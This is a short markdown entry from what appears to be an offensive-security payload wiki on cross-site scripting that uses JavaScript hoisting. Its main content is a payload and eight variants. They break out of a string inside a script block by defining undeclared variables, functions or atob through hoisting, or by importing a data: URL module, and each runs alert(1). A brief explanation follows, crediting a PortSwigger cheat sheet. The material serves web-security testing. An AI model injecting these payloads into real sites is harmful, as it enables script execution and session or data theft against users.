---
title: JavaScript Hoisting via var / function Declaration
slug: js-hoisting
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/script-injection, sink/js-string]
inbound: []
---

# JavaScript Hoisting via var / function Declaration

## Payload

```javascript
<script>eval(myUndefVar);var inject="INJECTION_STARTS_HERE";var myUndefVar;alert(1);//";</script>
```

## Variants

```javascript
<script>myUndefFunction(13,37);var inject="INJECTION_STARTS_HERE";function myUndefFunction(){};alert(1);//";</script>
<script>var myUndefObject = new myUndefClass();var inject="INJECTION_STARTS_HERE";function myUndefClass(){};alert(1);//";</script>
<script>$(document).ready(function(){var inject="INJECTION_STARTS_HERE";});function $(){return{ready:()=>0}};alert(1);(function(){"";});</script>
<script>undef01.undef02("INJECTION"+alert(1));function undef01(){}//");</script>
<script>undef01['undef02','INJECTION'+alert(1)];function undef01(){};//'];</script>
<script type="module">undef01.undef02.undef03.undef04.undef05();var inject = "INJECTION";import "data:text/jscript,alert(1)"//";</script>
<script>var x=atob("dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh");undef01.undef02();var inject = "INJECTION";function atob(){alert(1);}//";</script>
```

## Context

Applies when injection is inside a `<script>` block before a `var` declaration or `function` definition. JavaScript hoisting evaluates all `var`/`function` declarations before executing the script body, so an earlier call to `eval(myUndefVar)` or `myUndefFunction()` does not throw — the declaration is already registered. The injection point breaks out of the current expression by injecting a terminator (`"`) then new code, followed by `//` to comment out the rest. The array-syntax variant (`['undef02','INJECTION']`) avoids needing quotes. The module+`import` variant requires `type="module"`. The native-function-hijacking variant redefines `atob` via hoisting.

## Provenance

- Distilled from: `../../techniques/dom-xss/consuming-tags-and-hoisting.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Consuming Tags and Hoisting](../../techniques/dom-xss/consuming-tags-and-hoisting.md)
